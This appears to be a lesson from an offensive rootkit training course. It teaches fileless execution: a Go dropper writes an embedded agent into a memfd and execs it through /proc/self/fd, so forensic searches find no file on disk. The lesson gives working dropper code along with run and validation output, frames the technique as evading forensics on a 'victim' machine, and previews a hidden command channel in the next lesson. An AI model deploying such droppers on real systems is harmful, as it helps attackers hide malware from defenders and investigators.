# L21: Fileless Agent Execution

L20 loaded a kernel module without writing a .ko to disk.
But the loader binary itself was a file.
And any agent binary you deploy is a file too.
Forensics finds both with a simple `find`.

The MagisterQuis technique eliminates the binary from disk entirely.
The process runs, but there is no file backing it.

## What you will observe

The agent keeps running after its launcher disappears:

```console
student@victim:~$ readlink /proc/1234/exe
/memfd: (deleted)
student@victim:~$ find / -type f -name agent 2>/dev/null
```

`/proc/1234/exe` proves that PID 1234 still has executable code.
The empty `find` result proves there is no corresponding directory entry.

## Workspace

```text
exercises/L21-fileless-exec
├── go.mod
├── go.sum
└── main.go
```

The build embeds the supplied agent in the dropper.
Complete `main.go` so the dropper replaces itself with that embedded program.

## Replace the launcher from memory

The trick is the same building block (memfd_create) with one critical
difference: no `MFD_CLOEXEC`.

```text
+----------------------------+
| dropper process            |
|   embedded agent bytes     |
+-------------+--------------+
              | write to memfd
              v
+----------------------------+
| /proc/self/fd/N            |
|   anonymous executable     |
+-------------+--------------+
              | exec
              v
+----------------------------+
| same PID, new program      |
|   /proc/PID/exe -> memfd   |
+----------------------------+
```

Why no `MFD_CLOEXEC`: exec replaces the current process image.
Close-on-exec flags cause the kernel to close the fd before the new process
starts.
But exec needs to read the ELF from that fd.
If the fd is closed, exec fails with ENOENT.

Why `/proc/self/fd/N`: exec needs a path.
A memfd has no directory entry, but every open fd has a symlink at
`/proc/self/fd/<number>`.
The kernel follows this symlink and reads the executable from the memfd.

After exec, the original memfd name is gone. `/proc/pid/exe` points to something
like `/memfd: (deleted)`.
There is no file on disk to find.

## Implement it

Complete `main.go`:

- Create a memfd without `MFD_CLOEXEC`
- Write the embedded agent bytes to the memfd
- Build the `/proc/self/fd/N` path
- Exec into the agent via `unix.Exec`

## Keep the descriptor across `exec`

```go
import "golang.org/x/sys/unix"

// Create memfd WITHOUT MFD_CLOEXEC. The fd must survive exec.
fd, err := unix.MemfdCreate("", 0)

// Write the agent binary to the memfd.
n, err := unix.Write(fd, agentBytes)

// Build the path to the fd.
path := fmt.Sprintf("/proc/self/fd/%d", fd)

// Replace this process with the agent.
// argv[0] can be anything (used for process name in ps).
// envv can be nil or os.Environ().
err = unix.Exec(path, []string{"agent"}, nil)
```

```go
import _ "embed"

//go:embed agent
var agentBytes []byte
```

## Test it

```sh
./rklings run L21
```

`run` starts the staged dropper in the background and removes the staged file.
Inspect the resulting process inside the guest:

```text
student@victim:~$ ps aux | grep agent
student   1234  0.0  0.1  12345  6789 ?  S  00:00  0:00 agent
student@victim:~$ ls -la /proc/1234/exe
lrwxrwxrwx 1 student student 0 ... /proc/1234/exe -> /memfd: (deleted)
student@victim:~$ find / -name 'agent' -type f 2>/dev/null
(no output)
```

The agent is running. `/proc/pid/exe` shows `(deleted)` because it points to a
memfd, not a real file.
No binary exists on disk.

## Validate

```sh
./rklings validate L21
  [+] agent process is running
  [+] no agent binary on disk
  [+] /proc/pid/exe shows (deleted)
  PASS
```

## Next

The target no longer needs a module or agent file after startup, but anyone who
connects to the server still reaches the operator endpoint.
L22 shows ordinary visitors a decoy page while authenticated agents reach the
command channel on the same port.
